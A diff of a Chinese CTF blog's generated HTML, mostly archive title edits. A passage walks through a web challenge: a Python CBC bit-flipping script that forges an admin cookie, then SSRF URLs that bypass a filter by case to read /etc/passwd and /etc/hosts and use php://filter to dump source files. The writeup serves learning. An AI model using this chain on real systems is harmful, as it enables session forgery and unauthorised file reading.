class="line">s = requests.get(url=url,cookies=cookie)</span><br><span class="line"><span class="keyword">print</span> s.content</span><br></pre></td></tr></table></figure></p>
-<p>得到回显：<br><img src="/images/3inter (18).png"><br>解一下base64得到：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">~£66åKúÃFme&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:3:&quot;123&quot;;&#125;</span><br></pre></td></tr></table></figure></p>
+<p>得到回显：<br><img src="/images/3inter (18" alt="">.png)<br>解一下base64得到：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">~£66åKúÃFme&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:3:&quot;123&quot;;&#125;</span><br></pre></td></tr></table></figure></p>
 <p>发现我们构造后的密文不可被序列化的原因是，我们一开始伪造第二组数据的时候改变了第一组的数据，导致第一组成了乱码<br>此时想到还需要二次构造，利用我们知道的iv，再次伪造第一组数据，将其变为一开始的<code>a:2:{s:8:&quot;userna</code><br>这里的操作还和上次一样，利用公式即可<br>我直接附上完整脚本<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">url = <span class="string">"http://123.206.222.169:50001/login.php"</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">"logname"</span>:<span class="string">"1dmin"</span>,</span><br><span class="line">    <span class="string">"logpass"</span>:<span class="string">"123"</span></span><br><span class="line">&#125;</span><br><span class="line">r = requests.post(url=url,data=data)</span><br><span class="line">list = r.headers[<span class="string">'Set-Cookie'</span>].split(<span class="string">", "</span>)</span><br><span class="line">token = urllib.unquote(list[<span class="number">1</span>][<span class="number">6</span>:])</span><br><span class="line">cipher = base64.b64decode(urllib.unquote(list[<span class="number">2</span>][<span class="number">7</span>:]))</span><br><span class="line">phpsessid = list[<span class="number">0</span>].split(<span class="string">";"</span>)[<span class="number">0</span>][<span class="number">10</span>:]</span><br><span class="line">block = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(cipher),<span class="number">16</span>):</span><br><span class="line">    block.append(cipher[i:i+<span class="number">16</span>])</span><br><span class="line">replace = chr(ord(block[<span class="number">0</span>][<span class="number">9</span>]) ^ ord(<span class="string">'1'</span>) ^ ord(<span class="string">'a'</span>))</span><br><span class="line">block[<span class="number">0</span>] = block[<span class="number">0</span>][:<span class="number">9</span>]+replace+block[<span class="number">0</span>][<span class="number">10</span>:]</span><br><span class="line">token = base64.b64decode(token)</span><br><span class="line">cipher_new = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(block)):</span><br><span class="line">    cipher_new += block[i]</span><br><span class="line">cookie=&#123;</span><br><span class="line">    <span class="string">"PHPSESSID"</span>:phpsessid,</span><br><span class="line">    <span class="string">"cipher"</span>:urllib.quote(base64.b64encode(cipher_new)),</span><br><span class="line">    <span class="string">"token"</span>:urllib.quote(base64.b64encode(token))</span><br><span class="line">&#125;</span><br><span class="line">s = requests.get(url=url,cookies=cookie)</span><br><span class="line"><span class="keyword">print</span> s.content</span><br><span class="line">res_tr = <span class="string">r"&lt;p&gt;base64_decode(.*?)can't unserialize&lt;/p&gt;"</span></span><br><span class="line">m_tr =  re.findall(res_tr,s.content)</span><br><span class="line">base = m_tr[<span class="number">0</span>][<span class="number">2</span>:<span class="number">-3</span>]</span><br><span class="line">plain = base64.b64decode(base)[:<span class="number">16</span>]</span><br><span class="line">want = <span class="string">'a:2:&#123;s:8:"userna'</span></span><br><span class="line">first_16 = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">    first_16 += chr(ord(plain[i]) ^ ord(token[i]) ^ ord(want[i]))</span><br><span class="line">newiv = first_16</span><br><span class="line">cookie=&#123;</span><br><span class="line">    <span class="string">"PHPSESSID"</span>:phpsessid,</span><br><span class="line">    <span class="string">"cipher"</span>:urllib.quote(base64.b64encode(cipher_new)),</span><br><span class="line">    <span class="string">"token"</span>:urllib.quote(base64.b64encode(newiv))</span><br><span class="line">&#125;</span><br><span class="line">k = requests.get(url=url,cookies=cookie)</span><br><span class="line"><span class="keyword">print</span> phpsessid</span><br></pre></td></tr></table></figure></p>
 <p>此时我们可以得到一个phpsessionid了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">j8cbomulc1dijjdja3dnpm1ji6</span><br></pre></td></tr></table></figure></p>
-<p>此时我们的构造成功，此phpsessionid的username就是admin<br>我们用cookieedit改变一下<br><img src="/images/3inter (19).png"><br>保存后访问admin.php<br>得到回显<br><img src="/images/3inter (20).png"><br>此时我们登录成功<br>观察url<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://123.206.222.169:50001/admin.php?url=http://skysec.top/</span><br></pre></td></tr></table></figure></p>
+<p>此时我们的构造成功，此phpsessionid的username就是admin<br>我们用cookieedit改变一下<br><img src="/images/3inter (19" alt="">.png)<br>保存后访问admin.php<br>得到回显<br><img src="/images/3inter (20" alt="">.png)<br>此时我们登录成功<br>观察url<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://123.206.222.169:50001/admin.php?url=http://skysec.top/</span><br></pre></td></tr></table></figure></p>
 <p>猜测是一个ssrf<br>尝试file://读文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://123.206.222.169:50001/admin.php?url=file://skysec.top/</span><br></pre></td></tr></table></figure></p>
-<p>得到回显<br><img src="/images/3inter (21).png"><br>发现file被过滤了，这里想到上次乐清小俊杰的过滤<br>我们尝试大小写绕过<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://123.206.222.169:50001/admin.php?url=File:///etc/passwd</span><br></pre></td></tr></table></figure></p>
-<p>成功读取文件<br><img src="/images/3inter (22).png"><br>找寻一番，发现没有flag的踪迹<br>于是读etc/hosts文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://123.206.222.169:50001/admin.php?url=File:///etc/hosts</span><br></pre></td></tr></table></figure></p>
-<p>看到回显<br><img src="/images/3inter (23).png"><br>发现有172.17.0.1的内网<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">访问http://123.206.222.169:50001/admin.php?url=172.17.0.1</span><br></pre></td></tr></table></figure></p>
-<p>发现是空白页面，右键查看源代码<br><img src="/images/3inter (24).png"><br>发现有读文件<br>但是有过滤<br>这里我们选择使用<br><code>php://filter/read=convert.base64-encode/resource</code>的读取方式<br>看index.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://123.206.222.169:50001/admin.php?url=172.17.0.1?file=php://filter/read=convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure></p>
+<p>得到回显<br><img src="/images/3inter (21" alt="">.png)<br>发现file被过滤了，这里想到上次乐清小俊杰的过滤<br>我们尝试大小写绕过<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://123.206.222.169:50001/admin.php?url=File:///etc/passwd</span><br></pre></td></tr></table></figure></p>
+<p>成功读取文件<br><img src="/images/3inter (22" alt="">.png)<br>找寻一番，发现没有flag的踪迹<br>于是读etc/hosts文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://123.206.222.169:50001/admin.php?url=File:///etc/hosts</span><br></pre></td></tr></table></figure></p>
+<p>看到回显<br><img src="/images/3inter (23" alt="">.png)<br>发现有172.17.0.1的内网<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">访问http://123.206.222.169:50001/admin.php?url=172.17.0.1</span><br></pre></td></tr></table></figure></p>
+<p>发现是空白页面，右键查看源代码<br><img src="/images/3inter (24" alt="">.png)<br>发现有读文件<br>但是有过滤<br>这里我们选择使用<br><code>php://filter/read=convert.base64-encode/resource</code>的读取方式<br>看index.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://123.206.222.169:50001/admin.php?url=172.17.0.1?file=php://filter/read=convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure></p>
 <p>回显<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PD9waHAKCWVycm9yX3JlcG9ydGluZygwKTsKCWluY2x1ZGUgImZsYWcucGhwIjsKCWlmKCEkX0dFVFsnZmlsZSddKQoJCXsKCQkJZWNobyBmaWxlX2dldF9jb250ZW50cygiLi9pbmRleC5waHAiKTsKCQl9CgkkZmlsZT0kX0dFVFsnZmlsZSddOwoJaWYoc3Ryc3RyKCRmaWxlLCIuLi8iKXx8c3RyaXN0cigkZmlsZSwgInRwIil8fHN0cmlzdHIoJGZpbGUsImlucHV0Iil8fHN0cmlzdHIoJGZpbGUsImRhdGEiKSkKCXsKCQllY2hvICJPaCBubyEiOwoJCWV4aXQoKTsKCX0KCWluY2x1ZGUoJGZpbGUpOyAKPz4K</span><br></pre></td></tr></table></figure></p>
 <p>发现可以成功读取<br>于是猜想到可能存在flag.php<br>尝试<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://123.206.222.169:50001/admin.php?url=172.17.0.1?file=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure></p>
 <p>得到回显<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PD9waHAgCi8vZWNobyAiY3VtdGN0Zntza3lfYW5kX2hpc19jYmNfaXNfc29fY29vbD99IjsKPz4KCg==</span><br></pre></td></tr></table></figure></p>
@@ -463,8 +463,8 @@ height:50vh;
         <li class="previous">
             
                 <div class="prevSlogan">Previous Post</div>
-                <a href= "/2018/01/22/2018安恒一月月赛部分题解/" title= "2018安恒一月月赛部分题解">
-                    <div class="prevTitle">2018安恒一月月赛部分题解</div>
+                <a href= "/2018/01/22/2018安恒一月月赛部分题解/" title= "2018 安恒一月月赛部分题解">
+                    <div class="prevTitle">2018 安恒一月月赛部分题解</div>
                 </a>
             
         </li>
@@ -4371,6 +4371,34 @@ top:50vh;
     
     
     
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
     <div class="total-and-search">
         <div class="total-archive">
         Total : 214
@@ -4386,6 +4414,11 @@ top:50vh;
     
     <div class="archive-year"> 2020 </div>
     <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/21</span><a class="archive-post-title" href= "/2020/06/21/2019-TMCTF-Final-Hack-Server/" >2019 TMCTF Final & Hack Server</a>
+        </li>
     
     
         <li class="archive-post-item">
@@ -4583,7 +4616,7 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">03/29</span><a class="archive-post-title" href= "/2019/03/29/Pwnhub-Always-be-with-U-Writeup/" >Pwnhub-Always be with U-Writeup</a>
+            <span class="archive-post-date">03/29</span><a class="archive-post-title" href= "/2019/03/29/Pwnhub-Always-be-with-U-Writeup/" >2019 Pwnhub-Always be with U-Writeup</a>
         </li>
     
     
@@ -4598,12 +4631,12 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">03/10</span><a class="archive-post-title" href= "/2019/03/10/2018-Code-Breaking-1-function/" >2018 Code Breaking(1) & function</a>
+            <span class="archive-post-date">03/10</span><a class="archive-post-title" href= "/2019/03/10/2018-Code-Breaking-2-pcrewaf/" >2018 Code Breaking(2) & pcrewaf</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">03/10</span><a class="archive-post-title" href= "/2019/03/10/2018-Code-Breaking-2-pcrewaf/" >2018 Code Breaking(2) & pcrewaf</a>
+            <span class="archive-post-date">03/10</span><a class="archive-post-title" href= "/2019/03/10/2018-Code-Breaking-1-function/" >2018 Code Breaking(1) & function</a>
         </li>
     
     
@@ -4623,12 +4656,7 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">02/24</span><a class="archive-post-title" href= "/2019/02/24/2019安恒杯-2月月赛Writeup/" >2019安恒杯-2月月赛Writeup</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">02/22</span><a class="archive-post-title" href= "/2019/02/22/2019-Hgame-Week4-Crypto-MixedRSA-Easy/" >2019-Hgame-Week4-Crypto&MixedRSA_Easy</a>
+            <span class="archive-post-date">02/24</span><a class="archive-post-title" href= "/2019/02/24/2019安恒杯-2月月赛Writeup/" >2019 安恒杯 2月月赛 Writeup</a>
         </li>
     
     
@@ -4638,32 +4666,32 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">02/19</span><a class="archive-post-title" href= "/2019/02/19/2019-Hgame-Week4-Crypto&Sign_in_SemiHard/" >2019-Hgame-Week4-Crypto&Sign_in_SemiHard</a>
+            <span class="archive-post-date">02/19</span><a class="archive-post-title" href= "/2019/02/19/2019-Hgame-Week4-Crypto&Sign_in_SemiHard/" >2019 Hgame Week4 Crypto&Sign_in_SemiHard</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">02/18</span><a class="archive-post-title" href= "/2019/02/18/2019-Hgame-Web-Week4/" >2019-Hgame-Web-Week4</a>
+            <span class="archive-post-date">02/18</span><a class="archive-post-title" href= "/2019/02/18/2019-Hgame-Web-Week4/" >2019 Hgame Web Week4 Writeup</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">02/10</span><a class="archive-post-title" href= "/2019/02/10/2019-Hgame-Web&Crypto-Week3/" >2019-Hgame-Web&Crypto-Week3</a>
+            <span class="archive-post-date">02/10</span><a class="archive-post-title" href= "/2019/02/10/2019-Hgame-Web&Crypto-Week3/" >2019 Hgame Web&Crypto Week3 Writeup</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">02/05</span><a class="archive-post-title" href= "/2019/02/05/2019-Hgame-Web-Week2/" >2019-Hgame-Web-Week2</a>
+            <span class="archive-post-date">02/05</span><a class="archive-post-title" href= "/2019/02/05/2019-Hgame-Web-Week2/" >2019 Hgame Web Week2 Writeup</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">01/25</span><a class="archive-post-title" href= "/2019/01/25/2019-Hgame-Web-Week1/" >2019-Hgame-Web-Week1</a>
+            <span class="archive-post-date">01/25</span><a class="archive-post-title" href= "/2019/01/25/2019-Hgame-Web-Week1/" >2019 Hgame Web Week1</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">01/25</span><a class="archive-post-title" href= "/2019/01/25/2019安恒1月月赛Writeip/" >2019安恒1月月赛Writeip</a>
+            <span class="archive-post-date">01/25</span><a class="archive-post-title" href= "/2019/01/25/2019安恒1月月赛Writeip/" >2019 安恒杯 1月月赛 Writeup</a>
         </li>
     
     
@@ -4697,7 +4725,7 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">12/17</span><a class="archive-post-title" href= "/2018/12/17/2018SWPUCTF-Web/" >2018SWPUCTF-Web</a>
+            <span class="archive-post-date">12/17</span><a class="archive-post-title" href= "/2018/12/17/2018SWPUCTF-Web/" >2018 SWPUCTF Web</a>
         </li>
     
     
@@ -4707,7 +4735,7 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">11/24</span><a class="archive-post-title" href= "/2018/11/24/2018安恒杯11月月赛writeup/" >2018安恒杯11月月赛writeup</a>
+            <span class="archive-post-date">11/24</span><a class="archive-post-title" href= "/2018/11/24/2018安恒杯11月月赛writeup/" >2018 安恒杯 11月月赛writeup</a>
         </li>
     
     
@@ -4717,12 +4745,12 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">11/17</span><a class="archive-post-title" href= "/2018/11/17/2018-Xctf Final&LCTF-Bestphp/" >2018-Xctf Final&LCTF-Bestphp</a>
+            <span class="archive-post-date">11/17</span><a class="archive-post-title" href= "/2018/11/17/2018-Xctf Final&LCTF-Bestphp/" >2018 Xctf Final LCTF-Bestphp</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">11/16</span><a class="archive-post-title" href= "/2018/11/16/EIS-2018-web/" >EIS-2018-web</a>
+            <span class="archive-post-date">11/16</span><a class="archive-post-title" href= "/2018/11/16/EIS-2018-web/" >2018 EIS web</a>
         </li>
     
     
@@ -4737,7 +4765,7 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">11/04</span><a class="archive-post-title" href= "/2018/11/04/2018上海大学生信息安全竞赛-web/" >2018上海大学生信息安全竞赛-web</a>
+            <span class="archive-post-date">11/04</span><a class="archive-post-title" href= "/2018/11/04/2018上海大学生信息安全竞赛-web/" >2018 上海大学生信息安全竞赛 web</a>
         </li>
     
     
@@ -4747,12 +4775,12 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">10/13</span><a class="archive-post-title" href= "/2018/10/13/2018护网杯-web-writeup/" >2018护网杯-web-writeup</a>
+            <span class="archive-post-date">10/13</span><a class="archive-post-title" href= "/2018/10/13/2018护网杯-web-writeup/" >2018 护网杯 web writeup</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">09/24</span><a class="archive-post-title" href= "/2018/09/24/2018安恒杯-9月月赛Writeup/" >2018安恒杯-9月月赛Writeup</a>
+            <span class="archive-post-date">09/24</span><a class="archive-post-title" href= "/2018/09/24/2018安恒杯-9月月赛Writeup/" >2018安恒杯 9月月赛Writeup</a>
         </li>
     
     
@@ -4782,7 +4810,7 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">08/25</span><a class="archive-post-title" href= "/2018/08/25/2018安恒8月赛Writeup/" >2018安恒8月赛Writeup</a>
+            <span class="archive-post-date">08/25</span><a class="archive-post-title" href= "/2018/08/25/2018安恒8月赛Writeup/" >2018 安恒8月赛 Writeup</a>
         </li>
     
     
@@ -4807,7 +4835,7 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">08/20</span><a class="archive-post-title" href= "/2018/08/20/2018WhiteHat-writeup/" >2018WhiteHat-writeup</a>
+            <span class="archive-post-date">08/20</span><a class="archive-post-title" href= "/2018/08/20/2018WhiteHat-writeup/" >2018 WhiteHat writeup</a>
         </li>
     
     
@@ -4827,7 +4855,7 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">08/17</span><a class="archive-post-title" href= "/2018/08/17/RealWorldCTF-Web/" >RealWorldCTF-Web</a>
+            <span class="archive-post-date">08/17</span><a class="archive-post-title" href= "/2018/08/17/RealWorldCTF-Web/" >2018 RealWorld Web Writeup</a>
         </li>
     
     
@@ -4862,17 +4890,17 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">07/30</span><a class="archive-post-title" href= "/2018/07/30/ISITDTU-CTF-Web/" >ISITDTU CTF-Web</a>
+            <span class="archive-post-date">07/30</span><a class="archive-post-title" href= "/2018/07/30/ISITDTU-CTF-Web/" >2018 ISITDTU CTF-Web</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">07/26</span><a class="archive-post-title" href= "/2018/07/26/MeePwn-Web-复现/" >MeePwn-Web-复现</a>
+            <span class="archive-post-date">07/26</span><a class="archive-post-title" href= "/2018/07/26/MeePwn-Web-复现/" >2018 MeePwn-Web-复现</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">07/23</span><a class="archive-post-title" href= "/2018/07/23/巅峰极客-Web补题/" >巅峰极客-Web补题</a>
+            <span class="archive-post-date">07/23</span><a class="archive-post-title" href= "/2018/07/23/巅峰极客-Web补题/" >2018 巅峰极客-Web补题</a>
         </li>
     
     
@@ -4917,17 +4945,17 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">06/03</span><a class="archive-post-title" href= "/2018/06/03/2018-6-1信息安全铁人三项赛数据赛题解/" >2018.6.1信息安全铁人三项赛数据赛题解</a>
+            <span class="archive-post-date">06/03</span><a class="archive-post-title" href= "/2018/06/03/2018-6-1信息安全铁人三项赛数据赛题解/" >2018.6.1 信息安全铁人三项赛数据赛题解</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">05/31</span><a class="archive-post-title" href= "/2018/05/31/2018.5.18信息安全铁人三项赛数据赛题解/" >2018.5.18信息安全铁人三项赛数据赛题解</a>
+            <span class="archive-post-date">05/31</span><a class="archive-post-title" href= "/2018/05/31/2018.5.18信息安全铁人三项赛数据赛题解/" >2018.5.18 信息安全铁人三项赛数据赛题解</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">05/30</span><a class="archive-post-title" href= "/2018/05/30/2018.5.5信息安全铁人三项赛数据赛题解/" >2018.5.5信息安全铁人三项赛数据赛题解</a>
+            <span class="archive-post-date">05/30</span><a class="archive-post-title" href= "/2018/05/30/2018.5.5信息安全铁人三项赛数据赛题解/" >2018.5.5 信息安全铁人三项赛数据赛题解</a>
         </li>
     
     
@@ -4962,7 +4990,7 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">04/22</span><a class="archive-post-title" href= "/2018/04/22/DDCTF-bitcoin-51per-Attack/" >DDCTF-bitcoin-51%Attack</a>
+            <span class="archive-post-date">04/22</span><a class="archive-post-title" href= "/2018/04/22/DDCTF-bitcoin-51per-Attack/" >2018 DDCTF-bitcoin-51%Attack</a>
         </li>
     
     
@@ -4992,17 +5020,17 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">04/11</span><a class="archive-post-title" href= "/2018/04/11/0ctf-ezdoor/" >0ctf-ezdoor</a>
+            <span class="archive-post-date">04/11</span><a class="archive-post-title" href= "/2018/04/11/0ctf-ezdoor/" >2018 0ctf-ezdoor</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">04/09</span><a class="archive-post-title" href= "/2018/04/09/0ctf-login-me/" >0ctf-login me</a>
+            <span class="archive-post-date">04/09</span><a class="archive-post-title" href= "/2018/04/09/0ctf-login-me/" >2018 0ctf-login me</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">04/04</span><a class="archive-post-title" href= "/2018/04/04/pwnhub-time-injection带来的新思路/" >pwnhub time injection带来的新思路</a>
+            <span class="archive-post-date">04/04</span><a class="archive-post-title" href= "/2018/04/04/pwnhub-time-injection带来的新思路/" >2018 pwnhub time injection带来的新思路</a>
         </li>
     
     
@@ -5102,12 +5130,12 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">01/22</span><a class="archive-post-title" href= "/2018/01/22/2018安恒一月月赛部分题解/" >2018安恒一月月赛部分题解</a>
+            <span class="archive-post-date">01/22</span><a class="archive-post-title" href= "/2018/01/22/2018安恒一月月赛部分题解/" >2018 安恒一月月赛部分题解</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">01/18</span><a class="archive-post-title" href= "/2018/01/18/XCTF-赛博地球杯工业互联网安全大赛web部分题解/" >XCTF-赛博地球杯工业互联网安全大赛web部分题解</a>
+            <span class="archive-post-date">01/18</span><a class="archive-post-title" href= "/2018/01/18/XCTF-赛博地球杯工业互联网安全大赛web部分题解/" >2018 XCTF-赛博地球杯工业互联网安全大赛web部分题解</a>
         </li>
     
     
@@ -5156,12 +5184,12 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">12/19</span><a class="archive-post-title" href= "/2017/12/19/安恒12月赛之VSCMS审计/" >安恒12月赛之VSCMS审计</a>
+            <span class="archive-post-date">12/19</span><a class="archive-post-title" href= "/2017/12/19/安恒12月赛之VSCMS审计/" >2017 安恒12月赛之VSCMS审计</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">12/17</span><a class="archive-post-title" href= "/2017/12/17/安恒杯-12月月赛/" >安恒杯-12月月赛</a>
+            <span class="archive-post-date">12/17</span><a class="archive-post-title" href= "/2017/12/17/安恒杯-12月月赛/" >2017 安恒杯-12月月赛</a>
         </li>
     
     
@@ -5171,7 +5199,7 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">12/14</span><a class="archive-post-title" href= "/2017/12/14/pwnhub成功就是要梭哈之学习记录/" >pwnhub成功就是要梭哈之学习记录</a>
+            <span class="archive-post-date">12/14</span><a class="archive-post-title" href= "/2017/12/14/pwnhub成功就是要梭哈之学习记录/" >2017 pwnhub成功就是要梭哈之学习记录</a>
         </li>
     
     
@@ -5201,12 +5229,12 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">11/27</span><a class="archive-post-title" href= "/2017/11/27/湖湘杯复赛web400/" >湖湘杯复赛web400</a>
+            <span class="archive-post-date">11/27</span><a class="archive-post-title" href= "/2017/11/27/湖湘杯复赛web400/" >2017 湖湘杯复赛web400</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">11/25</span><a class="archive-post-title" href= "/2017/11/25/湖湘杯复赛web题解/" >湖湘杯复赛web题解</a>
+            <span class="archive-post-date">11/25</span><a class="archive-post-title" href= "/2017/11/25/湖湘杯复赛web题解/" >2017 湖湘杯复赛web题解</a>
         </li>
     
     
@@ -5226,32 +5254,32 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">11/12</span><a class="archive-post-title" href= "/2017/11/12/hctf的3道web题题解/" >hctf的3道web题题解</a>
+            <span class="archive-post-date">11/12</span><a class="archive-post-title" href= "/2017/11/12/hctf的3道web题题解/" >2017 hctf的3道web题题解</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">11/05</span><a class="archive-post-title" href= "/2017/11/05/上海赛的RSA研究/" >上海赛的RSA研究</a>
+            <span class="archive-post-date">11/05</span><a class="archive-post-title" href= "/2017/11/05/上海赛的RSA研究/" >2017 上海赛的RSA研究</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">11/05</span><a class="archive-post-title" href= "/2017/11/05/上海线上赛web题解/" >上海线上赛web题解</a>
+            <span class="archive-post-date">11/05</span><a class="archive-post-title" href= "/2017/11/05/上海线上赛web题解/" >2017 上海线上赛web题解</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">10/30</span><a class="archive-post-title" href= "/2017/10/30/XDCTF线下赛经历及感悟/" >XDCTF线下赛经历及感悟</a>
+            <span class="archive-post-date">10/30</span><a class="archive-post-title" href= "/2017/10/30/XDCTF线下赛经历及感悟/" >2017 XDCTF线下赛经历及感悟</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">10/29</span><a class="archive-post-title" href= "/2017/10/29/安恒总决赛的一道代码审计/" >安恒总决赛的一道代码审计</a>
+            <span class="archive-post-date">10/29</span><a class="archive-post-title" href= "/2017/10/29/安恒总决赛的一道代码审计/" >2017 安恒总决赛的一道代码审计</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">10/28</span><a class="archive-post-title" href= "/2017/10/28/geekgame部分题解/" >geekgame部分web题解</a>
+            <span class="archive-post-date">10/28</span><a class="archive-post-title" href= "/2017/10/28/geekgame部分题解/" >2017 geekgame部分web题解</a>
         </li>
     
     
@@ -5261,7 +5289,7 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">10/23</span><a class="archive-post-title" href= "/2017/10/23/BDCTF第一轮初赛web题解/" >BDCTF第一轮初赛web题解</a>
+            <span class="archive-post-date">10/23</span><a class="archive-post-title" href= "/2017/10/23/BDCTF第一轮初赛web题解/" >2017 BDCTF第一轮初赛web题解</a>
